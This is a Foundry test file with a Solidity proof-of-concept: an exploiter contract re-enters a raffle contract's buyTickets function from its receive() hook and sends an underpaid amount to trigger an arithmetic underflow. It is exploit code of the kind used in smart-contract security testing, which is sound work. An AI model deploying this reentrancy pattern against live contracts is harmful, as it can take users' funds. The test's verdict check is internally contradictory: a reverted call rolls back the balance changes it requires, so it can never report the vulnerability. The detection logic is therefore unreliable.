// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etheraffle.sol";

contract UnderflowExploiter {
    Ethraffle_v4b public raffle;
    bool public reentered;
    uint256 public constant PRICE_PER_TICKET = 0.01 ether;

    constructor(Ethraffle_v4b _raffle) payable {
        raffle = _raffle;
    }

    function exploit() public payable {
        // First ticket purchase with just enough for 1 ticket + extra to trigger reentrancy
        raffle.buyTickets{value: PRICE_PER_TICKET + 0.0001 ether}();
    }

    receive() external payable {
        // Re-enter with insufficient funds to cause underflow
        if (!reentered) {
            reentered = true;
            raffle.buyTickets{value: PRICE_PER_TICKET - 1 wei}();
        }
    }
}

contract EthraffleUnderflowTest is Test {
    Ethraffle_v4b public raffle;
    UnderflowExploiter public exploiter;
    address constant USER = address(0x123);

    function setUp() public {
        raffle = new Ethraffle_v4b();
        vm.deal(USER, 10 ether);
    }

    function test_arithmeticUnderflow() public {
        vm.startPrank(USER);
        exploiter = new UnderflowExploiter{value: 0.011 ether}(raffle);

        console2.log("--- BEFORE-Trigger Exploit ---");
        uint256 raffleBalanceBefore = address(raffle).balance;
        uint256 exploiterBalanceBefore = address(exploiter).balance;
        console2.log("raffle balance:", raffleBalanceBefore);
        console2.log("exploiter balance:", exploiterBalanceBefore);
        
        console2.log("--- Trigger Exploit ---");
        (bool success, ) = address(exploiter).call(
            abi.encodeWithSignature("exploit()")
        );
        
        console2.log("--- AFTER-Trigger Exploit ---");
        uint256 raffleBalanceAfter = address(raffle).balance;
        uint256 exploiterBalanceAfter = address(exploiter).balance;
        console2.log("raffle balance:", raffleBalanceAfter);
        console2.log("exploiter balance:", exploiterBalanceAfter);
        
        uint256 raffleBalanceDelta = raffleBalanceAfter - raffleBalanceBefore;
        uint256 exploiterBalanceDelta = exploiterBalanceBefore - exploiterBalanceAfter;
        console2.log("raffle balance delta:", raffleBalanceDelta);
        console2.log("exploiter balance delta:", exploiterBalanceDelta);
        
        console2.log("=== VERDICT ===");
        // Expected case: First buys ticket (10100000000000000 wei transferred)
        uint256 expectedFirstTransfer = 0.01 ether + 0.0001 ether;
        // Vulnerable case: Underflow occurs causing revert
        bool isVulnerable = !success && raffleBalanceDelta == expectedFirstTransfer && exploiterBalanceDelta == expectedFirstTransfer;
        
        if (isVulnerable) {
            console2.log("Vulnerability Exists: Exploit reverted with expected ETH transfers, confirming underflow vulnerability");
        } else {
            console2.log("Vulnerability not Exist: Exploit behavior doesn't match vulnerability pattern (Tx status:%s, ETH delta:%s)", success, raffleBalanceDelta);
        }
        vm.stopPrank();
    }
}